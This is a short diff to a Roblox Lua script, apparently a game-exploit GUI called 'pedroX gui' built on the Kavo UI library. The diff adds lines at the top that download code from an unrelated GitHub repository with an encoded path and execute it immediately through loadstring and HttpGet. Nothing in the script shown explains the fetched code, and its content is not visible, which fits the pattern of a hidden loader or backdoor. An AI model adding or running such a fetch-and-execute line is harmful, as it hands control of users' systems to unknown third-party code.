@@ -1,3 +1,8 @@
+--Eae
+loadstring(game:HttpGet("https://raw.githubusercontent.com/dedegahatesyou/bruhr/main/%3B-%3B"))()
+wait(0.1)
+print("test")
+
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 
 local Window = Library.CreateLib("pedroX gui", "BloodTheme")
